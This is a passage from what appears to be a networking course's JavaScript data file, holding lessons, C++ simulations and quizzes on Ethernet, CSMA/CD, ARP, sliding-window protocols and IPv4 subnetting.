10101010 for clock synchronization\nSFD:       10101011 (Start Frame Delimiter)\nDst MAC:   Destination MAC address (6 bytes / 48 bits)\nSrc MAC:   Source MAC address\nType/Len:  EtherType (e.g., 0x0800 = IPv4, 0x86DD = IPv6)\nPayload:   46 to 1500 bytes (padded if &lt; 46)\nFCS:       Frame Check Sequence (CRC-32)</div><p class="learn-p"><b>MAC Addresses:</b> A MAC address is a <b>48-bit (6-byte)</b> hardware address, usually written in hex: <code>AA:BB:CC:DD:EE:FF</code>. The first 3 bytes are the <b>OUI (Organizationally Unique Identifier)</b> assigned by IEEE, and the last 3 bytes are assigned by the manufacturer. <code>FF:FF:FF:FF:FF:FF</code> is the <b>broadcast MAC address</b>.</p></div><div class="learn-section"><div class="learn-h">Ethernet Evolution</div><table class="learn-table"><tr><th>Standard</th><th>Speed</th><th>Medium</th><th>Max Distance</th></tr><tr><td>10BASE-T</td><td>10 Mbps</td><td>Twisted Pair</td><td>100m</td></tr><tr><td>100BASE-TX (Fast Ethernet)</td><td>100 Mbps</td><td>Cat-5 UTP</td><td>100m</td></tr><tr><td>1000BASE-T (Gigabit)</td><td>1 Gbps</td><td>Cat-5e/Cat-6</td><td>100m</td></tr><tr><td>10GBASE-T</td><td>10 Gbps</td><td>Cat-6a/Cat-7</td><td>100m</td></tr></table></div><div class="learn-section"><div class="learn-h">Switches vs Hubs</div><table class="learn-table"><tr><th>Feature</th><th>Hub</th><th>Switch</th></tr><tr><td>Layer</td><td>Physical (L1)</td><td>Data Link (L2)</td></tr><tr><td>Forwarding</td><td>Broadcasts to all ports</td><td>Forwards to specific port (MAC table)</td></tr><tr><td>Collision Domain</td><td>Shared (all ports)</td><td>Separate per port</td></tr><tr><td>Duplex</td><td>Half-duplex</td><td>Full-duplex</td></tr><tr><td>Intelligence</td><td>None</td><td>Learns MAC addresses</td></tr></table><div class="learn-tip"><b>Tip:</b> A switch <b>learns</b> which MAC address is on which port by examining the source MAC of incoming frames. It maintains a <b>MAC address table (CAM table)</b>. If the destination MAC is unknown, it floods the frame to all ports (except the source port).</div></div><div class="learn-section"><div class="learn-h">Hub vs Switch vs Router</div><table class="learn-table"><tr><th>Feature</th><th>Hub</th><th>Switch</th><th>Router</th></tr><tr><td>OSI Layer</td><td>Physical (L1)</td><td>Data Link (L2)</td><td>Network (L3)</td></tr><tr><td>Addressing</td><td>None (electrical signal)</td><td>MAC addresses</td><td>IP addresses</td></tr><tr><td>Collision Domain</td><td>Shared (one for all ports)</td><td>Separate per port</td><td>Separate per port</td></tr><tr><td>Broadcast Domain</td><td>Shared (one)</td><td>Shared (one, unless VLANs)</td><td>Separate per interface</td></tr><tr><td>Intelligence</td><td>None — repeats to all</td><td>Learns MAC-to-port mapping</td><td>Routing table, NAT, ACLs</td></tr><tr><td>Use Case</td><td>Obsolete</td><td>LAN interconnection</td><td>Inter-network / WAN / Internet</td></tr></table></div><div class="learn-section"><div class="learn-h">ARP (Address Resolution Protocol)</div><p class="learn-p">ARP maps an <b>IP address to a MAC address</b> within a local network. When Host A wants to send a frame to Host B on the same subnet, it needs B\'s MAC address. A sends an <b>ARP Request</b> (broadcast) and B replies with an <b>ARP Reply</b> (unicast) containing its MAC. The mapping is cached in the <b>ARP table</b>.</p><div class="learn-code">ARP Request: "Who has 192.168.1.5? Tell 192.168.1.1"\n   Src MAC: AA:BB:CC:DD:EE:01  Dst MAC: FF:FF:FF:FF:FF:FF\n\nARP Reply: "192.168.1.5 is at AA:BB:CC:DD:EE:05"\n   Src MAC: AA:BB:CC:DD:EE:05  Dst MAC: AA:BB:CC:DD:EE:01</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Why does Ethernet have a minimum frame size of 64 bytes?</b><br>A: For CSMA/CD collision detection to work, the sender must still be transmitting when the collision signal (jam) propagates back. The minimum frame must take at least 2 * propagation_delay to transmit. For 10 Mbps Ethernet with max 2500m cable: RTT ~51.2 us, so min frame = 51.2 us * 10 Mbps = 512 bits = 64 bytes.</p><p class="learn-p"><b>Q2: Why can\'t CSMA/CD be used in wireless networks?</b><br>A: Due to the <b>hidden terminal problem</b> — station A may not hear station C\'s transmission (C is out of range), so A thinks the channel is free and transmits, colliding at station B. Also, wireless signal strength drops dramatically with distance, making collision detection unreliable. CSMA/CA with RTS/CTS solves this.</p><p class="learn-p"><b>Q3: How does a switch learn MAC addresses?</b><br>A: When a frame arrives on a port, the switch reads the <b>source MAC address</b> and records it in the <b>CAM table</b>. When forwarding, it looks up the destination MAC. If found, it sends only to that port (unicast). If not found, it floods the frame to all ports except the source port. Entries expire after a timeout (typically 300 seconds).</p><p class="learn-p"><b>Q4: What is Binary Exponential Backoff?</b><br>A: After a collision in CSMA/CD, the station chooses a random wait from [0, 2^min(n,10) - 1] slot times, where n is the collision count. The exponential growth spreads out retransmission attempts, reducing repeated collisions. After 16 failures, the transmission is aborted.</p><p class="learn-p"><b>Q5: What is the difference between a collision domain and a broadcast domain?</b><br>A: A collision domain is a segment where simultaneous transmissions collide. A hub creates one large collision domain; a switch creates separate collision domains per port. A broadcast domain is where a broadcast frame reaches all devices. Switches do NOT separate broadcast domains — only routers or VLANs do.</p></div>',
          code: `// === CSMA/CD Simulation and Ethernet Frame Parser in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <iomanip>
using namespace std;

// ---- Binary Exponential Backoff (BEB) ----
int binaryExponentialBackoff(int collisionCount) {
    // k chosen from [0, 2^min(n, 10) - 1]
    int n = min(collisionCount, 10);
    int maxSlots = (1 << n); // 2^n
    int k = rand() % maxSlots;
    return k; // return number of slot times to wait
}

void simulateCSMACD(int numStations) {
    cout << "=== CSMA/CD Simulation ===" << endl;
    const int SLOT_TIME_US = 512; // 512-bit time for 10 Mbps Ethernet = 51.2 us
    srand(time(0));

    for (int station = 0; station < numStations; station++) {
        int attempts = 0;
        bool transmitted = false;

        while (!transmitted && attempts < 16) {
            // Sense channel (simulate random collision)
            bool collision = (rand() % 3 == 0); // 33% collision chance

            if (collision && attempts < 15) {
                attempts++;
                int backoffSlots = binaryExponentialBackoff(attempts);
                int waitTime = backoffSlots * SLOT_TIME_US;
                cout << "Station " << station << ": Collision #" << attempts
                     << " -> backoff " << backoffSlots << " slots ("
                     << waitTime << " us)" << endl;
            } else {
                transmitted = true;
                cout << "Station " << station << ": Frame transmitted successfully"
                     << " after " << attempts << " collisions" << endl;
            }
        }
        if (!transmitted) {
            cout << "Station " << station << ": FAILED after 16 attempts!" << endl;
        }
    }
}

// ---- Ethernet Frame Structure ----
struct EthernetFrame {
    string dstMAC;    // 6 bytes
    string srcMAC;    // 6 bytes
    uint16_t etherType; // 2 bytes (0x0800 = IPv4)
    string payload;   // 46-1500 bytes
    uint32_t fcs;     // 4 bytes CRC-32

    void display() {
        cout << "\\n=== Ethernet Frame ===" << endl;
        cout << "Dst MAC:    " << dstMAC << endl;
        cout << "Src MAC:    " << srcMAC << endl;
        cout << "EtherType:  0x" << hex << setfill('0') << setw(4)
             << etherType << dec << endl;
        cout << "Payload:    " << payload.substr(0, 40) << "..." << endl;
        cout << "Payload Sz: " << payload.size() << " bytes" << endl;
        cout << "FCS (CRC):  0x" << hex << fcs << dec << endl;
    }
};

// ---- ARP Table Simulation ----
struct ARPEntry {
    string ip;
    string mac;
    int ttl; // seconds remaining
};

class ARPTable {
    vector<ARPEntry> table;
public:
    void addEntry(string ip, string mac, int ttl = 300) {
        // Check if entry exists, update if so
        for (auto& e : table) {
            if (e.ip == ip) { e.mac = mac; e.ttl = ttl; return; }
        }
        table.push_back({ip, mac, ttl});
    }

    string resolve(string ip) {
        for (auto& e : table) {
            if (e.ip == ip) return e.mac;
        }
        return ""; // not found, need ARP request
    }

    void display() {
        cout << "\\n=== ARP Table ===" << endl;
        cout << "IP Address\\t\\tMAC Address\\t\\tTTL" << endl;
        for (auto& e : table) {
            cout << e.ip << "\\t" << e.mac << "\\t" << e.ttl << "s" << endl;
        }
    }
};

// ---- ALOHA Throughput Calculator ----
void alohaCalculator() {
    cout << "\\n=== ALOHA Throughput ===" << endl;
    double G_values[] = {0.25, 0.5, 1.0, 1.5, 2.0};
    cout << "Load G\\tPure ALOHA\\tSlotted ALOHA" << endl;
    for (double G : G_values) {
        double pure = G * exp(-2.0 * G);
        double slotted = G * exp(-G);
        cout << fixed << setprecision(2) << G << "\\t"
             << setprecision(4) << pure << "\\t\\t"
             << slotted << endl;
    }
    cout << "\\nMax Pure ALOHA:   S = " << 1.0/(2*exp(1.0))
         << " at G = 0.5" << endl;
    cout << "Max Slotted ALOHA: S = " << 1.0/exp(1.0)
         << " at G = 1.0" << endl;
}

int main() {
    simulateCSMACD(5);

    EthernetFrame frame;
    frame.dstMAC = "AA:BB:CC:DD:EE:02";
    frame.srcMAC = "AA:BB:CC:DD:EE:01";
    frame.etherType = 0x0800; // IPv4
    frame.payload = "HTTP GET / request data goes here...";
    frame.fcs = 0xABCD1234;
    frame.display();

    ARPTable arp;
    arp.addEntry("192.168.1.1", "AA:BB:CC:DD:EE:01");
    arp.addEntry("192.168.1.2", "AA:BB:CC:DD:EE:02");
    arp.addEntry("192.168.1.3", "AA:BB:CC:DD:EE:03");
    arp.display();

    string resolved = arp.resolve("192.168.1.2");
    cout << "\\nResolve 192.168.1.2 -> " << resolved << endl;

    alohaCalculator();
    return 0;
}`,
          problems: [
            ['Ethernet Frame Size Calculation', 'https://www.geeksforgeeks.org/ethernet-frame-format/', 'Easy'],
            ['CSMA/CD Efficiency Problems', 'https://www.geeksforgeeks.org/efficiency-of-csma-cd/', 'Medium'],
            ['VLAN Concepts and Configuration', 'https://www.geeksforgeeks.org/virtual-lan-vlan/', 'Medium'],
            ['Collision Domain vs Broadcast Domain', 'https://www.geeksforgeeks.org/collision-domain-and-broadcast-domain-in-computer-network/', 'Easy']
          ],
          mcqs: [
            {q: 'What is the minimum Ethernet frame size and why?', o: ['32 bytes — to fill the bus', '64 bytes — to ensure collision detection works within 2 * propagation delay', '128 bytes — standard IEEE requirement', '46 bytes — minimum payload size'], a: 1},
            {q: 'The maximum throughput of Slotted ALOHA is approximately:', o: ['18.4%', '36.8%', '50%', '100%'], a: 1},
            {q: 'In CSMA/CD, what happens after a collision is detected?', o: ['Station retransmits immediately', 'Station sends a jam signal and uses binary exponential backoff', 'Station waits for a token', 'Station sends an RTS frame'], a: 1},
            {q: 'In CSMA/CA, the RTS/CTS mechanism solves which problem?', o: ['Collision detection', 'Hidden terminal problem', 'MAC address resolution', 'Frame fragmentation'], a: 1},
            {q: 'The Ethernet preamble (7 bytes of 10101010) is used for:', o: ['Error detection', 'MAC address resolution', 'Clock synchronization', 'Encryption'], a: 2},
            {q: 'A switch separates:', o: ['Broadcast domains only', 'Collision domains only', 'Both collision and broadcast domains', 'Neither'], a: 1},
            {q: 'The OUI (first 3 bytes) of a MAC address identifies:', o: ['The device type', 'The network segment', 'The manufacturer', 'The VLAN'], a: 2},
            {q: 'Maximum throughput of Pure ALOHA is approximately:', o: ['36.8%', '18.4%', '50%', '25%'], a: 1}
          ],
        },
        {
          t: 'Sliding Window Protocols',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Consider a satellite link with 500 ms round-trip delay and 1 Gbps bandwidth. With Stop-and-Wait, you\'d utilize less than 0.001% of the link capacity. <b>Sliding window protocols</b> allow the sender to have multiple frames in flight simultaneously, dramatically increasing throughput. This concept directly influences TCP\'s flow control mechanism and is a staple in GATE exams and SDE interviews for numerical problems on efficiency, window sizing, and sequence number constraints.</p></div><div class="learn-section"><div class="learn-h">Why Sliding Window?</div><p class="learn-p"><b>Stop-and-Wait</b> is simple but extremely inefficient: the sender sends one frame, waits for an ACK, then sends the next. Utilization = t_trans / (t_trans + 2 * t_prop), which is very low for high bandwidth-delay product links. <b>Sliding Window protocols</b> allow the sender to transmit <b>multiple frames</b> before needing an acknowledgment, dramatically increasing throughput.</p><p class="learn-p">The "window" is the set of sequence numbers the sender is allowed to transmit. As ACKs arrive, the window "slides" forward.</p><div class="learn-code">Sender window size = W\nSequence number bits = n → sequence space = 2^n\n\nUtilization (a = t_prop / t_trans):\n  If W ≥ 1 + 2a:  utilization = 100%\n  If W &lt; 1 + 2a:  utilization = W / (1 + 2a)</div></div><div class="learn-section"><div class="learn-h">Go-Back-N (GBN)</div><p class="learn-p">In GBN, the sender can have up to <b>W</b> unacknowledged frames outstanding. The receiver only accepts frames <b>in order</b>. If a frame is lost or corrupted, the receiver discards all subsequent frames until the missing one is retransmitted.</p><table class="learn-table"><tr><th>Property</th><th>Go-Back-N</th></tr><tr><td>Sender window size</td><td>W ≤ 2^n − 1</td></tr><tr><td>Receiver window size</td><td>1 (only accepts in-order)</td></tr><tr><td>ACK type</td><td>Cumulative ACK</td></tr><tr><td>On error</td><td>Retransmit lost frame + all subsequent frames</td></tr><tr><td>Receiver complexity</td><td>Simple (no buffering)</td></tr><tr><td>Bandwidth waste</td><td>High (retransmits correct frames too)</td></tr></table><div class="learn-code">Example: Window W=4, Frames 0-6, Frame 2 lost\n\nSender:   [0] [1] [2] [3] [4] [5] ...\nReceiver: ACK0 ACK1 NAK2 (discards 3,4)\nSender retransmits: [2] [3] [4] [5] ...\n\nWhy W ≤ 2^n − 1?\nWith n=2 bits (seq 0-3), if W=4:\n  Sender sends 0,1,2,3 → all ACKed → window slides to 0,1,2,3\n  If all ACKs lost, sender retransmits 0,1,2,3\n  Receiver thinks these are NEW frames 0,1,2,3 → DUPLICATE ACCEPTED!</div></div><div class="learn-section"><div class="learn-h">Selective Repeat (SR)</div><p class="learn-p">In SR, the receiver accepts <b>out-of-order frames</b> and buffers them. Only the specific lost/corrupted frame is retransmitted, not the entire window. This is more bandwidth-efficient but requires more receiver buffering.</p><table class="learn-table"><tr><th>Property</th><th>Selective Repeat</th></tr><tr><td>Sender window size</td><td>W ≤ 2^(n−1)</td></tr><tr><td>Receiver window size</td><td>W ≤ 2^(n−1)</td></tr><tr><td>ACK type</td><td>Individual (selective) ACK</td></tr><tr><td>On error</td><td>Retransmit ONLY the lost frame</td></tr><tr><td>Receiver complexity</td><td>Complex (must buffer & reorder)</td></tr><tr><td>Bandwidth waste</td><td>Low (only retransmit what\'s lost)</td></tr></table><div class="learn-code">Example: Window W=4, Frames 0-6, Frame 2 lost\n\nSender:   [0] [1] [2] [3] [4] ...\nReceiver: ACK0 ACK1 (buffers 3,4) NAK2\nSender retransmits: [2] only\nReceiver: delivers 2,3,4 in order from buffer\n\nWhy W ≤ 2^(n−1)?\nSender window + Receiver window ≤ 2^n\nBoth windows same size → W + W ≤ 2^n → W ≤ 2^(n−1)\nThis prevents the receiver from confusing retransmitted \nframes with new frames in the next window cycle.</div></div><div class="learn-section"><div class="learn-h">GBN vs Selective Repeat — Side by Side</div><table class="learn-table"><tr><th>Feature</th><th>Go-Back-N</th><th>Selective Repeat</th></tr><tr><td>Sender window</td><td>2^n − 1</td><td>2^(n−1)</td></tr><tr><td>Receiver window</td><td>1</td><td>2^(n−1)</td></tr><tr><td>Retransmission</td><td>All from lost frame onward</td><td>Only lost frame</td></tr><tr><td>ACK type</td><td>Cumulative</td><td>Individual</td></tr><tr><td>Receiver buffer</td><td>Not needed</td><td>Required</td></tr><tr><td>Efficiency</td><td>Lower on lossy links</td><td>Higher on lossy links</td></tr><tr><td>Use case</td><td>Low error rate links</td><td>High error rate links</td></tr></table><div class="learn-tip"><b>GATE/Interview favorite:</b> Given n sequence bits, calculate max window size for GBN (2^n − 1) and SR (2^(n−1)). Also know the efficiency formula: η = W × t_frame / (t_frame + 2 × t_prop) when W &lt; 1 + 2a.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Given 3-bit sequence numbers, what is the maximum window size for GBN and SR?</b><br>A: GBN: W_max = 2^3 - 1 = 7. SR: W_max = 2^(3-1) = 4. With 3 bits we have sequence numbers 0-7 (8 values). GBN needs W &le; 7 to avoid confusing retransmitted frames with new ones. SR needs W &le; 4 because both sender and receiver windows must fit in the sequence space without overlap.</p><p class="learn-p"><b>Q2: A link has bandwidth 10 Mbps and propagation delay 200 ms. Frame size is 1000 bits. What window size achieves 100% utilization?</b><br>A: T_trans = 1000/10^7 = 0.1 ms. a = T_prop/T_trans = 200/0.1 = 2000. For 100%: W &ge; 1 + 2a = 1 + 4000 = 4001 frames.</p><p class="learn-p"><b>Q3: In GBN, what happens when frame 3 is lost but frames 4, 5, 6 arrive?</b><br>A: The receiver discards frames 4, 5, 6 (receiver window = 1, only accepts in-order). It sends duplicate ACKs for frame 2. When the sender\'s timer for frame 3 expires, it retransmits ALL frames from 3 onward.</p><p class="learn-p"><b>Q4: Why does Selective Repeat need receiver buffering but GBN does not?</b><br>A: In SR, the receiver accepts out-of-order frames and stores them in a buffer until the missing frame arrives. GBN\'s receiver simply discards out-of-order frames. SR trades receiver complexity for better bandwidth utilization on lossy links.</p><p class="learn-p"><b>Q5: What is the bandwidth-delay product and how does it relate to window size?</b><br>A: BDP = bandwidth * RTT, representing the maximum data "in flight." For full utilization, the window size (in bits) must be &ge; BDP. High-BDP links (satellite, transcontinental) need large windows. This is why TCP uses window scaling.</p></div>',
          code: `// Sliding Window Protocol Simulation

#include <iostream>
#include <vector>
#include <queue>
using namespace std;

// Go-Back-N Sender Simulation
class GBN_Sender {
    int window_size;
    int seq_bits;
    int seq_max;  // 2^n
    int base;     // oldest unacknowledged frame
    int next_seq; // next frame to send

public:
    GBN_Sender(int n_bits, int W)
        : seq_bits(n_bits), window_size(W), base(0), next_seq(0) {
        seq_max = 1 << n_bits;
        // Constraint: W <= 2^n - 1
        if (W > seq_max - 1) {
            cout << "Error: Window too large for GBN! Max = " << seq_max - 1 << endl;
        }
    }

    bool can_send() {
        return (next_seq - base + seq_max) % seq_max < window_size;
    }

    int send_frame() {
        if (!can_send()) return -1;
        int seq = next_seq % seq_max;
        cout << "GBN: Sent frame " << seq << endl;
        next_seq = (next_seq + 1) % seq_max;
        return seq;
    }

    void receive_ack(int ack) {
        // Cumulative ACK: all frames up to ack are acknowledged
        base = (ack + 1) % seq_max;
        cout << "GBN: Cumulative ACK " << ack << ", window slides to " << base << endl;
    }

    void timeout() {
        // Retransmit ALL frames from base to next_seq-1
        cout << "GBN: Timeout! Retransmitting frames " << base
             << " to " << (next_seq - 1 + seq_max) % seq_max << endl;
        // In real implementation: resend all frames in window
    }
};

// Selective Repeat Sender Simulation
class SR_Sender {
    int window_size;
    int seq_bits;
    int seq_max;
    int base;
    int next_seq;
    vector<bool> acked;

public:
    SR_Sender(int n_bits, int W)
        : seq_bits(n_bits), window_size(W), base(0), next_seq(0) {
        seq_max = 1 << n_bits;
        acked.assign(seq_max, false);
        // Constraint: W <= 2^(n-1)
        if (W > seq_max / 2) {
            cout << "Error: Window too large for SR! Max = " << seq_max / 2 << endl;
        }
    }

    bool can_send() {
        return (next_seq - base + seq_max) % seq_max < window_size;
    }

    int send_frame() {
        if (!can_send()) return -1;
        int seq = next_seq % seq_max;
        cout << "SR: Sent frame " << seq << endl;
        next_seq = (next_seq + 1) % seq_max;
        return seq;
    }

    void receive_ack(int ack) {
        // Individual ACK: only this specific frame is acknowledged
        acked[ack] = true;
        cout << "SR: Individual ACK for frame " << ack << endl;

        // Slide window past consecutive acked frames
        while (acked[base]) {
            acked[base] = false;
            base = (base + 1) % seq_max;
        }
    }

    void nak_received(int seq) {
        // Retransmit ONLY the specific frame
        cout << "SR: NAK for frame " << seq << ", retransmitting ONLY frame " << seq << endl;
    }
};

// Efficiency Calculator
void calculate_efficiency(int W, double t_frame, double t_prop) {
    double a = t_prop / t_frame;
    double efficiency;

    if (W >= 1 + 2 * a) {
        efficiency = 1.0;  // 100%
    } else {
        efficiency = (double)W / (1.0 + 2.0 * a);
    }

    cout << "\\nEfficiency Calculation:" << endl;
    cout << "Window size W = " << W << endl;
    cout << "a = t_prop/t_frame = " << a << endl;
    cout << "1 + 2a = " << 1 + 2*a << endl;
    cout << "Efficiency = " << efficiency * 100 << "%" << endl;
}

int main() {
    cout << "=== Go-Back-N (3 bits, W=7) ===" << endl;
    GBN_Sender gbn(3, 7);
    for (int i = 0; i < 7; i++) gbn.send_frame();
    gbn.receive_ack(2);  // frames 0,1,2 acknowledged
    gbn.timeout();        // retransmit 3,4,5,6

    cout << "\\n=== Selective Repeat (3 bits, W=4) ===" << endl;
    SR_Sender sr(3, 4);
    for (int i = 0; i < 4; i++) sr.send_frame();
    sr.receive_ack(0);
    sr.receive_ack(1);
    sr.nak_received(2);   // only retransmit frame 2
    sr.receive_ack(3);

    cout << "\\n=== Efficiency Example ===" << endl;
    // t_frame = 1ms, t_prop = 10ms, W = 7
    calculate_efficiency(7, 1.0, 10.0);

    return 0;
}`,
          problems: [
            ['Sliding Window Protocols', 'https://www.geeksforgeeks.org/sliding-window-protocol-set-1/', 'Easy'],
            ['Go-Back-N vs SR Comparison', 'https://www.geeksforgeeks.org/difference-between-go-back-n-and-selective-repeat-protocol/', 'Medium'],
            ['Window Size Numericals', 'https://www.geeksforgeeks.org/sliding-window-protocol-set-3-selective-repeat/', 'Hard'],
            ['Sequence Number Bit Calculations', 'https://www.geeksforgeeks.org/sliding-window-protocol-set-2-receiver-side/', 'Medium']
          ],
          mcqs: [
            {q: 'In Go-Back-N with n sequence number bits, the maximum sender window size is:', o: ['2^n', '2^n − 1', '2^(n−1)', '2^n + 1'], a: 1},
            {q: 'In Selective Repeat, if 3 bits are used for sequence numbers, the maximum window size is:', o: ['7', '8', '4', '3'], a: 2},
            {q: 'Which protocol retransmits only the lost frame?', o: ['Stop-and-Wait', 'Go-Back-N', 'Selective Repeat', 'Pure ALOHA'], a: 2},
            {q: 'In GBN, when frame 3 is lost but frames 4,5 arrive, the receiver:', o: ['Buffers 4,5 and waits for 3', 'Discards 4,5 and sends NAK for 3', 'Accepts 4,5 and ACKs them', 'Discards 4,5 and sends duplicate ACK for frame 2'], a: 3},
            {q: 'For 100% link utilization with sliding window, W must be at least:', o: ['1 + a', '1 + 2a', '2a', '2^n - 1'], a: 1},
            {q: 'In Go-Back-N, the receiver window size is always:', o: ['Equal to sender window', '1', '2^(n-1)', 'Variable'], a: 1},
            {q: 'The bandwidth-delay product determines:', o: ['Maximum frame size', 'Error rate', 'Maximum data in flight for full utilization', 'Number of routers'], a: 2},
            {q: 'Selective Repeat uses which type of ACK?', o: ['Cumulative ACK', 'Individual (selective) ACK', 'Negative ACK only', 'No acknowledgment'], a: 1}
          ]
        }
      ]
    },
    // ==================== TAB 3: Network Layer (OSI Layer 3) ====================
    {
      id: 'net', t: 'Network Layer',
      topics: [
        {
          t: 'IPv4 Addressing & Subnetting',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When a company\'s network team says "We need 200 hosts on subnet A and 50 on subnet B from a single /24 block," you need to know <b>VLSM subnetting</b> to divide the address space efficiently. Subnetting is one of the most frequently tested topics in networking interviews — you\'ll be asked to calculate network addresses, broadcast addresses, usable host ranges, and design subnet schemes on the spot. Every cloud deployment (AWS VPC, Azure VNet) requires subnetting knowledge.</p></div><div class="learn-section"><div class="learn-h">IPv4 Addressing Fundamentals</div><p class="learn-p">An <b>IPv4 address</b> is a <b>32-bit</b> logical address assigned to a network interface. It is written in <b>dotted decimal notation</b> as four octets separated by dots: <code>192.168.1.100</code>. Each octet ranges from 0 to 255. IPv4 provides approximately <b>4.3 billion</b> (2^32) unique addresses.</p><p class="learn-p">An IP address has two parts: the <b>Network ID</b> (identifies the network) and the <b>Host ID</b> (identifies the specific host on that network). The boundary between these two parts is determined by the <b>subnet mask</b>.</p><div class="learn-code">IP Address:   192.168.1.100  = 11000000.10101000.00000001.01100100\nSubnet Mask:  255.255.255.0  = 11111111.11111111.11111111.00000000\nNetwork ID:   192.168.1.0    (AND of IP &amp; Mask)\nHost ID:      0.0.0.100\nBroadcast:    192.168.1.255  (all host bits = 1)</div></div><div class="learn-section"><div class="learn-h">Classful Addressing</div><p class="learn-p">Originally, IPv4 addresses were divided into <b>five classes</b> (A through E) based on the leading bits of the first octet:</p><table class="learn-table"><tr><th>Class</th><th>Leading Bits</th><th>First Octet Range</th><th>Default Mask</th><th>Networks</th><th>Hosts/Network</th></tr><tr><td>A</td><td>0</td><td>1 - 126</td><td>/8 (255.0.0.0)</td><td>126</td><td>16,777,214</td></tr><tr><td>B</td><td>10</td><td>128 - 191</td><td>/16 (255.255.0.0)</td><td>16,384</td><td>65,534</td></tr><tr><td>C</td><td>110</td><td>192 - 223</td><td>/24 (255.255.255.0)</td><td>2,097,152</td><td>254</td></tr><tr><td>D</td><td>1110</td><td>224 - 239</td><td>N/A (Multicast)</td><td>N/A</td><td>N/A</td></tr><tr><td>E</td><td>1111</td><td>240 - 255</td><td>N/A (Reserved)</td><td>N/A</td><td>N/A</td></tr></table><div class="learn-warn"><b>Warning:</b> 127.0.0.0/8 is reserved for <b>loopback</b> (127.0.0.1 is localhost). It is NOT part of Class A for assignment. The formula for usable hosts is <code>2^h - 2</code> (subtract network and broadcast addresses).</div></div><div class="learn-section"><div class="learn-h">Private IP Ranges (RFC 1918)</div><p class="learn-p">These addresses are <b>not routable on the public Internet</b> and are used within private networks:</p><ul class="learn-list"><li><b>10.0.0.0/8</b> — Class A private range (10.0.0.0 to 10.255.255.255)</li><li><b>172.16.0.0/12</b> — Class B private range (172.16.0.0 to 172.31.255.255)</li><li><b>192.168.0.0/16</b> — Class C private range (192.168.0.0 to 192.168.255.255)</li></ul><p class="learn-p">NAT (Network Address Translation) is used to map private IPs to public IPs for Internet access.</p></div><div class="learn-section"><div class="learn-h">CIDR (Classless Inter-Domain Routing)</div><p class="learn-p">Classful addressing was <b>wasteful</b> — a Class C network only supports 254 hosts while a Class B supports 65,534. CIDR, introduced in 1993, allows <b>variable-length subnet masks (VLSM)</b>. The notation <code>a.b.c.d/n</code> means the first <b>n</b> bits are the network portion.</p><div class="learn-code">192.168.1.0/26\nMask: 255.255.255.192 = 11111111.11111111.11111111.11000000\nNetwork bits: 26, Host bits: 6\nSubnets possible: 4 (from /24)\nHosts per subnet: 2^6 - 2 = 62\n\nSubnet 0: 192.168.1.0   - 192.168.1.63   (Broadcast: .63)\nSubnet 1: 192.168.1.64  - 192.168.1.127  (Broadcast: .127)\nSubnet 2: 192.168.1.128 - 192.168.1.191  (Broadcast: .191)\nSubnet 3: 192.168.1.192 - 192.168.1.255  (Broadcast: .255)</div></div><div class="learn-section"><div class="learn-h">Subnetting — Step by Step</div><p class="learn-p">Subnetting divides a large network into smaller <b>subnets</b>. Here is the systematic approach:</p><ol class="learn-list"><li>Determine how many <b>subnets</b> or <b>hosts per subnet</b> you need.</li><li>Calculate the number of <b>bits to borrow</b> from the host portion: <code>2^s &ge; required subnets</code>.</li><li>Calculate the new <b>subnet mask</b>: original mask + s borrowed bits.</li><li>Calculate <b>hosts per subnet</b>: <code>2^h - 2</code> where <code>h = 32 - new prefix</code>.</li><li>List the subnet ranges: <b>block size = 2^h</b>.</li></ol><div class="learn-code">Problem: Divide 10.0.0.0/8 into subnets with at least 500 hosts each.\n\nStep 1: Need 2^h - 2 &ge; 500  &rarr; h &ge; 9  &rarr; h = 9  (510 hosts)\nStep 2: New prefix = 32 - 9 = /23\nStep 3: Mask = 255.255.254.0\nStep 4: Block size = 2^9 = 512 (but in terms of last variable octet: 2)\nStep 5: Subnets:\n  10.0.0.0/23   (10.0.0.1 to 10.0.1.254, broadcast 10.0.1.255)\n  10.0.2.0/23   (10.0.2.1 to 10.0.3.254, broadcast 10.0.3.255)\n  10.0.4.0/23   ...</div><div class="learn-tip"><b>Tip:</b> For quick subnetting, remember the "magic number" trick: <code>block size = 256 - value of the interesting octet in the subnet mask</code>. For mask 255.255.255.192, block size = 256 - 192 = 64.</div></div><div class="learn-section"><div class="learn-h">Special Addresses</div><table class="learn-table"><tr><th>Address</th><th>Purpose</th></tr><tr><td>0.0.0.0</td><td>Default route / "this network"</td></tr><tr><td>127.0.0.1</td><td>Loopback (localhost)</td></tr><tr><td>255.255.255.255</td><td>Limited broadcast (local network)</td></tr><tr><td>Network ID (host bits all 0)</td><td>Network address (not assignable)</td></tr><tr><td>Broadcast (host bits all 1)</td><td>Directed broadcast (not assignable)</td></tr><tr><td>169.254.0.0/16</td><td>Link-local (APIPA) — when DHCP fails</td></tr></table></div><div class="learn-section"><div class="learn-h">IPv4 Header Format</div><p class="learn-p">The IPv4 header is <b>20-60 bytes</b> long (20 bytes minimum, up to 40 bytes of options).</p><div class="learn-code">0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version|  IHL  |    DSCP   |ECN|         Total Length          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Identification        |Flags|    Fragment Offset      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|    TTL    |    Protocol   |       Header Checksum             |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Source IP Address                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                 Destination IP Address                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p 